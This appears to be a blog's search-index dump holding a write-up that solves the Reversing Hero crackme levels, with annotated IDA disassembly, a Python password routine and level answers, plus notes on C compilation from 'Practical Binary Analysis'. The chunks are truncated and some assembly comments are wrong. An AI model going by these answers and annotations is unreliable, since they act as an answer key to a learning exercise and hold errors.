[{"categories":["Reversing","Assembly"],"content":"ReversingHero is a 15 levels reverse engineering self learning kit.Every level the difficulty gradually increasing","date":"12 Jan 2022","objectID":"/reveringhero/","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"INTRODUCTION ReversingHero is a Reverse Engineering self learning kit (x86_64 on linux) wrapped inside one binary file. It is made of 15 levels, with difficulty gradually increasing. Created by xoprd, this course can be found here : Reversing Hero Here is just my attempt to solve the 15 levels. ","date":"12 Jan 2022","objectID":"/reveringhero/:1:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 1 ","date":"12 Jan 2022","objectID":"/reveringhero/:2:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 2 The following procedure shows a simple routine where there is a bit rotation. Basically what happens is a permutation of the inserted value, this permutation has to give as result the following number 89349536319392163324855876422573 Exploring the binary in IDA, we can see that the program is expecting a 64 length input. My first lazy experiment was to insert the string : abcdefghijklmnopqrstuvwxyz123456 Here we get an interesting output : lfatoi2wrd5zmgbupj3xse61nhcvqk4y So the permutation of abcdefghijklmnopqrstuvwxyz123456 gives lfatoi2wrd5zmgbupj3xse61nhcvqk4y, we can easily assume that lfatoi2wrd5zmgbupj3xse61nhcvqk4y corresponds to 89349536319392163324855876422573 l f a t o i 2 w r d 5 z m g b u p j 3 x s e 6 1 n h c v q k 4 y 8 9 3 4 9 5 3 6 3 1 9 3 9 2 1 6 3 3 2 4 8 5 5 8 7 6 4 2 2 5 7 3 Reversing the order of the string to its natural order we can then get: a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 3 1 4 1 5 9 2 6 5 3 5 8 9 7 9 3 2 3 8 4 6 2 6 4 3 3 8 3 2 7 9 5 So the requested input is : 31415926535897932384626433832795 Here the commented subroutine in assembly. ext:00000000004005DC begin of pwd generator 00000000004005DC 00000000004005DC rdi ;--\u003e x 00000000004005DC 00000000004005DC ; =============== S U B R O U T I N E ============================== 00000000004005DC 00000000004005DC 00000000004005DC sub_4005DC proc near ; CODE XREF: sub_400618+12↓p 00000000004005DC mov rax, rdi ; x = y 00000000004005DF add rax, 1010101b ; x = x +0x55 00000000004005E3 and rax, 11111b ; x= (x + 0x55) \u0026 0x1f 00000000004005E7 shr rax, 1 ; x= x \u003e\u003e 1 00000000004005EA jnb short loc_4005F0 ; Jump if Not Below (CF=0) 00000000004005EC 00000000004005EC ;if CF = 1 00000000004005EC or rax, 10000b ;x ^ 0x10000b 00000000004005F0 ; if CF = 0 00000000004005F0 loc_4005F0: ; CODE XREF: sub_4005DC+E↑j 00000000004005F0 and rax, 11111b ; x \u0026 0x1F 00000000004005F4 shr rax, 1 ; x \u003e\u003e 1 00000000004005F7 jnb short loc_4005FD ; Jump if Not Below (CF=0) 00000000004005F9 ; if CF=1 00000000004005F9 or rax, 10000 00000000004005FD ; if CF = 0 00000000004005FD loc_4005FD: ; CODE XREF: sub_4005DC+1B↑j 00000000004005FD and rax, 11111b ; x \u0026 0x1f 0000000000400601 shr rax, 1 ; x= x \u003e\u003e 1 0000000000400604 jnb short loc_40060A ; Jump if Not Below (CF=0) 0000000000400606 ; if CF = 1 0000000000400606 or rax, 10000b ;x ^ 0x10000b 000000000040060A ; if CF = 0 000000000040060A loc_40060A: ; CODE XREF: sub_4005DC+28↑j 000000000040060A mov rsi, rax ;-\u003e x = y 000000000040060D add rax, rax ;-\u003e x = 2y 0000000000400610 add rax, rsi ;-\u003e x = 2y + y = 3y 0000000000400613 and rax, 11111b ;-\u003e x \u0026 11111 0000000000400617 retn 0000000000400617 sub_4005DC endp 0000000000400617 0000000000400617 end of generator Below a small python routine to get the correct value to insert (not mine really, you can find the script @ geeksforgeeks.org) #!/usr/bin/python3 #Size of the bits BITS_SIZE = 5 #Function rotate to right #Rotate n by d bits def ROR5(n,d): #In n\u003e\u003ed, fist d bits are seto to 0 #To put last 3 bits of at first : # do -\u003e bitwaise OR of (n \u003e\u003e d) with (n \u003c\u003c (BITS_SIZE -d) return ((n \u003e\u003e d) | (n \u003c\u003c (BITS_SIZE -d))) \u0026 0xFFFFFFFF def iter_f(x): x = (x + 0x55) \u0026 0x1f \"\"\"for num in range(1,5):\"\"\" x = ROR5(x,3) x = (3*x) \u0026 0x1f return x def main(): \"\"\" print(\"Hello World!\") \"\"\" my_pass = \"89349536319392163324855876422573\" for num in range (32): print (my_pass[iter_f(num)], end=\"\") if __name__ == \"__main__\": main() ","date":"12 Jan 2022","objectID":"/reveringhero/:3:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 3 0000000000400529 ; =============== S U B R O U T I N E ========================= 0000000000400529 0000000000400529 ; 1st dword = edi(rdi)= a -\u003e -8 -\u003ehex(2^32 + (-8)) = fffffff8 0000000000400529 ; 2nd dword = esi(rsi)= b -\u003e -3 -\u003ehex(2^32 + (-3)) = fffffffd 0000000000400529 ; 3rd dword = edx(rdx)= c -\u003e 13 -\u003ehex(2^32 + (+13)) =(1)0000000d 0000000000400529 ; 0000000000400529 0000000000400529 sub_400529 proc near ; CODE XREF: _start+A7↑p 0000000000400529 lea ecx, [edi+edx] ; a+c 000000000040052D add ecx, esi ; (a+c)+b 000000000040052F add ecx, ecx ; 2*((a+c)+b) 0000000000400531 add ecx, esi ; (2*((a+c)+b)) + b == 1 0000000000400533 loop loc_400554 0000000000400535 lea ecx, [esi+edi*2] ; b+(2*a) 0000000000400539 add ecx, edx ; (b+(a*2))+c 000000000040053B add ecx, ecx ; 2*((b+(a*2))+c) 000000000040053D add ecx, edx ; (2*((b+(a*2))+c))+c 000000000040053F loop loc_400554 0000000000400541 lea ecx, [edi+edx] ; a+c 0000000000400545 add ecx, esi ; (a+c)+b 0000000000400547 shl ecx, 3 ; 8*((a+c)+b) --\u003e shl,3 = 2^3 000000000040054A add ecx, edi ; (8*((a+c)+b)) + a 000000000040054C sub ecx, edx ; ((8*((a+c)+b)) + a ) - c 000000000040054E sub ecx, esi ; (((8*((a+c)+b)) + a ) - c) - b 0000000000400550 sub ecx, esi ; ((((8*((a+c)+b)) + a ) - c) - b ) - b 0000000000400552 loop $+2 0000000000400554 0000000000400554 loc_400554: ; CODE XREF: sub_400529+A↑j 0000000000400554 sub_400529+16↑j ... 0000000000400554 mov rax, rcx 0000000000400557 retn 0000000000400557 sub_400529 endp 0000000000400557 0000000000400558 0000000000400558 ; =============== S U B R O U T I N E ======================================= ","date":"12 Jan 2022","objectID":"/reveringhero/:4:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 4 ;here where the routine starts, magic input 00000000000000000000000000000000000000000000000000000000000000001111111211211122121112121221122211111112112111221211121212211222 f_key_generator proc near ; CODE XREF: sub_4003E4+4A↓p 0000000000400368 sub rsi, 30h 000000000040036C jz short loc_40037A ; if RSI = 0 000000000040036E RSI \u003e 0 000000000040036E dec rsi ; RSI -=1 0000000000400371 jz short loc_400397 ; if RSI = 1 0000000000400373 if RSI \u003e 1 0000000000400373 dec rsi 0000000000400376 jz short loc_4003B8 ; if ((RSI \u003e 1) - 1) - 1 = 0 0000000000400378 jmp short f_exit 000000000040037A ; --------------------------------------------------------------------------- 000000000040037A IF RSI = 0 000000000040037A 000000000040037A loc_40037A: ; CODE XREF: f_key_generator+4↑j .000000000040037A mov ecx, [rdi+8] 000000000040037D jecxz f_exit ; The jecxz (or jne) instruction is a conditional jump that follows a test. 000000000040037D ; It jumps to the specified location if ECX=0 (f_exit) 0000000000400380 Sets bit in CL position to ZERO and DECREMENTS CL for reading next bit (going from 0x40f to 0) 0000000000400380 0000000000400380 EXC = 0x40 0000000000400380 RSI = 0 -\u003e read char \"0\" 0000000000400380 rax = x 0000000000400380 mov rax, [rdi] ; x = DEADFACEDEADBEEF 0000000000400383 rol rax, cl ; x \u003c\u003c\u003c cl -\u003e ror rax of cl 0000000000400386 0000000000400386 setting the LSB to 0 0000000000400386 eg. 0000000000400386 0000000000400386 01111 -\u003e initial LSB = 1 0000000000400386 shr 1 -\u003e 00111 0000000000400386 shl 1 -\u003e 01110 -\u003e LSB is now 0 0000000000400386 0000000000400386 0000000000400386 shr rax, 1 ; x = x/2 -\u003e divide rax by 2^1 -\u003e rax/2 0000000000400389 shl rax, 1 ; x = x * 2 -\u003e multiply rax by 2^1 -\u003e rax *2 000000000040038C ror rax, cl ; x \u003e\u003e\u003e cl -\u003e rol rax of cl 000000000040038F mov [rdi], rax ; copy x value at RDI memory location (RAX - 1) 0000000000400392 dec dword ptr [rdi+8] ; decremente x040f value 0000000000400395 jmp short loc_4003DB 0000000000400397 ; --------------------------------------------------------------------------- 0000000000400397 if RSI = 1 0000000000400397 0000000000400397 loc_400397: ; CODE XREF: f_key_generator+9↑j 0000000000400397 mov ecx, [rdi+8] 000000000040039A cmp ecx, 40h 000000000040039D jnb short f_exit ; if exc \u003e= 0x40 000000000040039F ;Sets bit in CL position to ZERO and INCREMENTS CL for reading next bit ;(going from 0 to 0x40f) 000000000040039F 000000000040039F RSI = 1 -\u003e read_char (\"1\") 000000000040039F ECX \u003c 0x40 000000000040039F mov rax, [rdi] 00000000004003A2 inc ecx 00000000004003A4 rol rax, cl 00000000004003A7 00000000004003A7 setting the LSB to 0 00000000004003A7 eg. 00000000004003A7 00000000004003A7 01111 -\u003e initial LSB = 1 00000000004003A7 shr 1 -\u003e 00111 00000000004003A7 shl 1 -\u003e 01110 -\u003e LSB is now 0 00000000004003A7 00000000004003A7 00000000004003A7 shr rax, 1 00000000004003AA shl rax, 1 00000000004003AD ror rax, cl 00000000004003B0 mov [rdi], rax 00000000004003B3 mov [rdi+8], ecx 00000000004003B6 jmp short loc_4003DB 00000000004003B8 ; --------------------------------------------------------------------------- 00000000004003B8 RSI = 2 -\u003e read_char(\"2\") 00000000004003B8 00000000004003B8 loc_4003B8: ; CODE XREF: f_key_generator+E↑j 00000000004003B8 mov ecx, [rdi+8] 00000000004003BB cmp ecx, 40h 00000000004003BE jnb short f_exit 00000000004003C0 Sets bit in CL position to ONE and INCREMENTS CL for reading next bit (going from 0 to 0x40f) 00000000004003C0 00000000004003C0 RSI = 2 -\u003e read_char (\"2\") 00000000004003C0 mov rax, [rdi] 00000000004003C3 inc ecx 00000000004003C5 rol rax, cl 00000000004003C8 set LSB to 1 00000000004003C8 00000000004003C8 eg. 00000000004003C8 00000000004003C8 01110 -\u003e initial LSB = 0 00000000004003C8 shr 1 -\u003e 00111 00000000004003C8 shl 1 -\u003e 01110 00000000004003C8 or 1 -\u003e 00001 00000000004003C8 ------- 00000000004003C8 01111 00000000004003C8 00000000004003C8 shr rax, 1 00000000004003CB shl rax, 1 00000000004003CE or rax, 1 00000000004003D2 ror rax, cl 00000000004003","date":"12 Jan 2022","objectID":"/reveringhero/:5:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 5 0000000000400340 sub_400340 proc near ; CODE XREF: _start+2A↓p 0000000000400340 ; DATA XREF: _start+6D↓o ... 0000000000400340 push r12 0000000000400342 push r13 0000000000400344 push r13 0000000000400346 mov r12, rdi 0000000000400349 mov r13, rsi 000000000040034C xor edx, edx ; Logical Exclusive OR 000000000040034E 000000000040034E loc_40034E: ; CODE XREF: sub_400340+36↓j 000000000040034E mov rcx, rdx 0000000000400351 0000000000400351 loc_400351: ; CODE XREF: sub_400340+2E↓j 0000000000400351 mov r8, [r12+rdx*8] 0000000000400355 cmp r8, [r12+rcx*8] ; Compare Two Operands 0000000000400359 --\u003e ja short loc_400368 ; Jump if Above (CF=0 \u0026 ZF=0) what if rdx=rcx ? 000000000040035B lea rdi, [r12+rdx*8] ; Load Effective Address 000000000040035F lea rsi, [r12+rcx*8] ; Load Effective Address 0000000000400363 call sub_40037F ; Call Procedure ;========= if rdx=rcx -\u003e the swap fuction will xor same values giving a result of 0 ======= 0000000000400368 0000000000400368 loc_400368: ; CODE XREF: sub_400340+19↑j 0000000000400368 inc rcx ; Increment by 1 000000000040036B cmp rcx, r13 ; Compare Two Operands 000000000040036E jb short loc_400351 ; Jump if Below (CF=1) 0000000000400370 inc rdx ; Increment by 1 0000000000400373 cmp rdx, r13 ; Compare Two Operands 0000000000400376 jb short loc_40034E ; Jump if Below (CF=1) 0000000000400378 pop r13 000000000040037A pop r13 000000000040037C pop r12 000000000040037E retn ; Return Near from Procedure 000000000040037E sub_400340 endp 000000000040037E 000000000040037F 000000000040037F ; =============== S U B R O U T I N E ======================================= 000000000040037F 000000000040037F 000000000040037F sub_40037F proc near ; CODE XREF: sub_400340+23↑p 000000000040037F mov rax, [rdi] ; eg [rdi] = a [rsi] = b 0000000000400382 xor [rsi], rax ; Logical Exclusive OR 0000000000400385 mov rax, [rsi] 0000000000400388 xor [rdi], rax ; Logical Exclusive OR 000000000040038B mov rax, [rdi] 000000000040038E xor [rsi], rax ; Logical Exclusive OR 0000000000400391 retn ; Return Near from Procedure 0000000000400391 sub_40037F endp 0000000000400391 0000000000400392 0000000000400392 ; =============== S U B R O U T I N E ======================================= Here the image shows that only if the result of “cmp r8,[r12+rcx*8]\" is r8 \u003e [r12+rcx*8] , then “ja” command jumps to loc_400368 0000000000400351 mov r8, [r12+rdx*8] 0000000000400355 cmp r8, [r12+rcx*8] ; Compare Two Operands 0000000000400359 --\u003e ja short loc_400368 ; Jump if Above (CF=0 \u0026 ZF=0) This situation can lead to a seriuous issue when [r12+rdx*8] is = to [r12+rcx*8], the following routine will xor the values to 0 if these values are the same 000000000040035B lea rdi, [r12+rdx*8] ; Load Effective Address 000000000040035F lea rsi, [r12+rcx*8] ; Load Effective Address ;rdi and rsi point to the same address 000000000040037F sub_40037F proc near ; CODE XREF: sub_400340+23↑p 000000000040037F mov rax, [rdi] ; [rdi] = a ; [rsi] = a ;mov rax , [a] ; rax = a 0000000000400382 xor [rsi], rax ; Logical Exclusive OR ; [rdi] = 0 \u003c--- also rdi is set to 0 ;xor [a], a = 0 ; [rsi] = 0 ; rax = a 0000000000400385 mov rax, [rsi] ; [rdi] = 0 ; [rsi] = 0 ;mov rax , [0] ; rax = 0 0000000000400388 xor [rdi], rax ; Logical Exclusive OR ;xor [a], 0 = a ; [rdi] = 0 ; [rsi] = 0 ; rax = 0 000000000040038B mov rax, [rdi] ; [rdi] = 0 ; [rsi] = 0 ;mov rax , [a] ; rax = 0 000000000040038E xor [rsi], rax ; Logical Exclusive OR ; [rdi] = 0 ;xor [0], a = a ; [rsi] = 0 ; rax = 0 0000000000400391 retn ; Return Near from Procedure 0000000000400391 sub_40037F endp 0000000000400391 0000000000400392 0000000000400392 In oder to avoid this issue we have to modify the “ja” (jump above) instruction into “jae” or “jnb”. ","date":"12 Jan 2022","objectID":"/reveringhero/:6:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"▸ Reversing Hero 6 Th analysis of this challange took me to function “sub_4006AE” Recent Posts {{range first .Site.Params.SidebarRecentLimit .Site.Recent}} {{.Title}} {{end}} ","date":"12 Jan 2022","objectID":"/reveringhero/:7:0","tags":["Reverse Engineering","Ida Pro","Assembly","Linux"],"title":"Reversing Hero","uri":"/reveringhero/"},{"categories":["Reversing","Assembly"],"content":"The anatomy of a BINARY, from the first chapter of the book from Daniel Andriesse \"Practical Binary Analysis\". ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"As malware increasingly obfuscates itself and applies anti-analysis techniques to thwart our analysis, we need more sophisticated methods that allow us to raise that dark curtain designed to keep us out--binary analysis can help. The goal of all binary analysis is to determine (and possibly modify) the true properties of binary programs to understand what they really do, rather than what we think they should do. While reverse engineering and disassembly are critical first steps in many forms of binary analysis, there is much more to be learned. SOMMARIO 2 ANATOMY OF BINARY 6 2.1 The C Compilation Process 6 2.1.1 The Processing Phase 7 2.1.2 The Compiling Phase 9 2.1.3 The Assembly Phase 11 2.1.4 The Linking Phase 12 2.2 Symbols and Stripped Binaries 15 2.2.1 Viewing Symbolic Information 15 2.2.2 Another Binary Turns to the dark side: Stripping a Binary 17 2.3 Disassembling a Binary 18 -- The content of this page is entirly coming from the “Practical Binary Analysis” book (https://practicalbinaryanalysis.com/) from Andriesse (https://mistakenot.net/) ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:0:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"CHAPTER 1 (pdf) ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:1:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ The anatomy of a BINARY ================= What exactly is a binary? Modern computers perform their computations using the binary numerical system, which express all numbers as strings of one and zeros. The machine code that these systems execute is called binary code. Every program consists of a collection of: Binary code the machine instructions Data variables, constants and the like To keep track of all the different programs on a given system is needed a way to store all the code and data belonging to each program in a self-contained file. These files, containing executable binary programs, are called binary executable files or simply binary ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:2:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"▸ The C Compilation Process Binaries are produced through compilation: COMPILATION : Is the process of translating human-readable source code into machine code that the processor can execute. Compiling C code involves four phases (modern compilers often merge some or all of these phases): Processing Compilation Assembly Linking ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:3:0","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ The Processing Phase Below a typical compilation process for C code: The compilation process starts with a number of source files that have to be compiled ( file-1.c through file-n.c ) It is possible to have one large file but typically, large programs are composed of many files, this for the following reasons: a) It makes the project easier to manage b) It speeds up compilation because if one file changes, only that file has to be recompiled instead of all the code. C source files contain: Macros (#define) Directives (#include): are used to include header files (with the extension .h), on which the source code depends. The Processing phase expands any “#define” macros or “#include” directives in the source file, so all that is left is pure C code ready to be compiled. Let take the following code as an example: //compilation_example.c #include \u003cstdio.h\u003e #define FORMAT_STRING “%s” #define MESSAGE “Hello, world!\\n” int main(int argc, char \\*argv\\[\\]) { printf(FORMAT_STRING,MESSAGE); return 0; } Let us compile the file “compilation_example.c” using gcc (into x86-64 code) using the following parameters: -E : tells gcc to stop after processing -P : causes the compiler to omit the debugging information, so that the output is a bit cleaner. Below the output of the C processor of the compilation_example.c gcc -E -P compilation_example.c --- $ gcc -E -P compilation_example.c typedef long unsigned int size_t; typedef unsigned char __u_char; typedef unsigned short int __u_short; typedef unsigned int __u_int; typedef unsigned long int __u_long; /*.....*/ extern int sys_nerr; extern const char *const sys_errlist\\[\\]; extern int fileno (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ; extern int fileno_unlocked (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ; extern FILE *popen (const char *__command, const char *__modes) ;* extern int pclose (FILE *__stream);* extern char *ctermid (char *__s) __attribute__ ((__nothrow__ , __leaf__)); extern void flockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern int ftrylockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); int main(int argc, char *argv[]) { printf(\"%s\", \"Hello, world!\\n\"); return 0; } --- The “stdio.h” header is included in its entirety, with all its type definitions, global variables, and function prototypes “copied in” to the source file. Because this happens for every #include directive, preprocessor output can be quite verbose. The preprocessor also fully expands all of any #define macros used. In the above example both arguments to “printf”* are evaluated and replaced by the constant strings they represent: ----- .. #define FORMAT_STRING \u003cb\u003e“%s”\u003c/b\u003e #define MESSAGE \u003cb\u003e“Hello, world!\\n”\u003c/b\u003e .. printf(FORMAT_STRING,MESSAGE);*.. ----- to: ------- .. printf(**\"%s**\", **\"Hello, world!\\n\"**); .. ------- ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:3:1","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ The Compiling Phase After the processing part is completed, the source is now ready to be compiled- The compilation phase takes the preprocessed code and translate it into assembly language. Most compilers also perform heavy optimization in this phase, typically configurable as an optimization level through command line switches such as option –Oo3 through –O3 in gcc. The degree of optimization during compilation can have a profound effect on disassembly. The main reason why the compilation phase produces assembly language instead of machine code is that writing a compiler that emits, at the same time, machine code for many different languages would be an extremely demanding and time-consuming task. It is better to instead emit assembly code, which is an already challenging task, and have a single dedicated assembler that can handle the final translation of assembly to machine code for every language. Therefore, the output of the compilation phase is: Assembly, in a reasonably human-readable form, with symbolic information intact. As mentioned, gcc normally calls all compilation phases automatically, so: To see the emitted assembly from the compilation stage, the parameters and options to use in order to tell gcc to stop after stage and store the assembly to the disk are: -S : This flag is for the conventional extension for assembly files “*.s” -masm=intel : With this option “gcc” emits assembly in Intel syntax rather than the default AT\u0026T syntax Below the output of the C processor of the compilation_example.c gcc -S -masm=intel compilation_example.c -------- $ gcc -S -masm=intel compilation\\_example.c $ ls –la *total 32* \\*….\\* -rw-r--r-- 1 binary binary 173 dec 8 16:29 compilation_example.c -rw-rw-r-- 1 binary binary 562 dec 8 19:57 **compilation_example.s* -rw-r--r-- 1 binary binary 10240 apr 19 2018 hello.exe -rw-r--r-- 1 binary binary 723 apr 19 2018 Makefile -------- Below the output of $ cat compilation_example.s $gcc -S -masm=intel compilation\\_example.c $cat compilation\\_example.s .file \"compilation\\_example.c\" .intel\\_syntax noprefix .section .rodata .LC0: (1) .string \"Hello, world!\" .text .globl main .type main, @function main: (2) .LFB0: .cfi_startproc push rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 mov rbp, rsp .cfi_def_cfa_register 6 sub rsp, 16 mov DWORD PTR [rbp-4], edi mov QWORD PTR [rbp-16], rsi mov edi, OFFSET FLAT:.LC0 (3) call puts mov eax, 0 leave .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \"GCC: (Ubuntu 5.4.0-6ubuntu1\\~16.04.5) 5.4.0 20160609\" .section .note.GNU-stack,\"\",@progbits The above code looks relatively easy to read because the symbols and functions have been preserved: ln.12 - The auto generated name LC0 for the nameless “Hello, world!” string. ln.22 - The explicit label for the mainfunction. ln.44 - The symbolic reference to code and data to the LC0(the“Hello, world!” string). Constants and variables have symbolic names rather than just address: Unfortunately, with stripped binaries it’s not possible to gain all these extensive information. ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:3:2","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ The Assembly Phase The Assembly phase: when some real machine code is finally generated! The input of the assembly phase is the set of assembly language files generated in the compilation phase, and the output is a set of object files, sometimes also referred to as module. Object files contain machine instructions that are in principle executable by the processor. Typically, each source file corresponds to one assembly file, and each assembly file corresponds to one object file. Below the process of generating an object file with gcc .The parameter to generate an object file, is -c : Flag to generate an object file. ----- ***\\$ gcc -c compilation\\_example.c*** *\\$ ls -la* *total 36* *drwxr-xr-x 2 binary binary 4096 dec 8 23:44 .* *drwxrwxr-x 16 binary binary 4096 apr 19 2018 ..* *-rw-r--r-- 1 binary binary 173 dec 8 16:29 compilation\\_example.c* *-rw-rw-r-- 1 binary binary 1536 dec 8 23:44 compilation\\_example.o* *-rw-rw-r-- 1 binary binary 562 dec 8 19:57 compilation\\_example.s* *-rw-r--r-- 1 binary binary 10240 apr 19 2018 hello.exe* *-rw-r--r-- 1 binary binary 723 apr 19 2018 Makefile* ----- The “file \u003cfile.o\u003e” utility to confirm that the produced file is indeed and object file $ file compilation\\_example.o compilation\\_example.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped Let’s analyse the output, the first part of the file output shows that the file conforms to the elf specification for binary executables: ELF 64-bit LSB relocatable -- ELF 64-bit LSB relocatable: It is a 64-bit ELF file (since we are compiling for 64-bit) It is LSB, meaning that numbers are ordered in memory with their least significant byte first. But most important is that is relocatable Relocatable files don’t rely on being placed at any particular address in memory; rather, they can be moved around at will without this breaking any assumption in the code. When you see the term relocatable in the file output, you know are dealing with an object file and not with an executable. (There *are also position-independent relocatable files executable, but these show up in files as shared objects rather than relocatable. You can tell them apart from ordinary shared libraries because they have an entry point) not stripped: Non-stripped binaries have debugging information built into it. So if you compile an executable with the flag -g (gcc -g), it contains debugging information. ELF 64-bit LSB relocatable It is a 64-bit ELF file (since we are compiling for 64-bit) It is **LSB**, meaning that numbers are ordered in memory with their least significant byte first. **But most important is that is *relocatable*** Relocatable files don’t rely on being placed at any particular address in memory; rather, they can be moved around at will without this breaking any assumption in the code. When you see the term relocatable in the file output, you know are dealing with an object file and not with an executable. (There *are also position-independent relocatable files executable, but these show up in files as shared objects rather than relocatable. You can tell them apart from ordinary shared libraries because they have an entry point) Not stripped ***Non-stripped binaries*** *have debugging information built into it*. So if you compile an executable with the flag -g (gcc -g), it contains debugging information. -- Object files are compiled independently from each other, so the assembler has no way of knowing the memory addresses of other objects files when assembling an object file. That’s why objects files need to be relocatable; so that you can link them together in any order to form a complete binary executable. (If objects files were not relocatable, that action would be impossible) ","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:3:3","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 (Chapter.1)","uri":"/practicalbinaryanalysis_part1/"},{"categories":["Reversing","Assembly"],"content":"◦ The Linking Phase The linking phase is the *final phase of the compilation process*. As the name implies, this phase links together all the object files **into a single binary executable.** In modern systems, *the linking phase* sometimes incorporate an **additional optimization pass**, called: **link-time optimization (LTO)** The program that performs the linking phase is called a ***linke**r*, or ***link editor*** and ***it is typically separate from the compiler**, which usually implements all the preceding phases*. **Objects file are relocatable** because they are **compiled independently from each other**, preventing the compiler from assuming that an object **will end up at any particular address**. **Moreover, “*object file”* may reference functions or variables in other *objects files* or in libraries that are external to the program**. **Before** the linking phase, **the address** at which the referenced code and data will be placed **are not yet known**: - ***relocation symbol*** : The **object files** **only contain** “*relocation symbol”* that can specify how function and variable references should eventually be resolved. - ***symbolic references** :* in the context of linking, *references that rely on a relocation symbol* **When an object file references *one of its own functions or variables by absolute address*, the reference will also be symbolic**. The linker’s job is to: Take all the object files belonging to a program. Merge them into a single coherent executable, typically intended to be loaded at a particular memory address. Now that the arrangement of all modules in the executable is known, the linker can also resolve most symbolic refences. References to libraries may or may not be completely resolved, depending on the type of library. Static libraries(on Linux typically have extension “. a*”)*: Are merged into the binary executable, allowing any references to them to be resolved entirely. Dynamic (shared) libraries : Are shared in memory among all programs that run on a system. Rather then copying the library into every binary that uses it, dynamic libraries are loaded into memory only once, and any binary that wants to use the library needs to use this shared copy. During the linking phase, the address at which dynamic libraries will reside are not yet known, so references to them cannot be resolved. Instead, the linker leaves symbolic references to these libraries even in the final executable, and these references are not resolved until the binary is actually loaded into memory to be executed. To produce a complete binary executable, only **gcc with no special switches is required. ** The below example shows the generated binary executable with **gcc (with -o it’s possible to name the file)**   -- $ gcc compilation_example.c $ ls -la total40 drwxr-xr-x2binarybinary4096dec1017:38. drwxrwxr-x16binarybinary4096apr192018.. -rwxrwxr-x1binarybinary8616dec1017:38a.out(with no switches, by default the executable is called ‘a.out’) -rw-r--r--1binarybinary172apr192018compilation_example.c -rw-r--r--1binarybinary10240apr192018hello.exe -rw-r--r--1binarybinary723apr192018Makefile Let’s run file commmand angainst the generated binary file a.out $ file a.out a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID\\[sha1\\]=c21ccd6d27df9e553a574b2be2d6d58501fa8a0b, not stripped Let’s analyse the output generated by the “file” utility ($ file a.out): ELF 64-bit LSB relocatable -- ELF 64-bit LSB executable: Rather then being relocatable, as in the assembly phase, now the ELF 64-bit LSB is executable It is LSB, meaning that numbers are ordered in memory with their least significant byte first. But most important is that is executable dynamically linked: The file is dynamically linked, meaning that it uses some libraries that are nit merged into the executable but are instead shared among all programs running on the same syste","date":"16 Nov 2021","objectID":"/practicalbinaryanalysis_part1/:3:4","tags":["ReverseEngineering","Assembly","Hacking","Debugging","Binary Analysis"],"title":"[Practical Binary Analysis]  Part.1 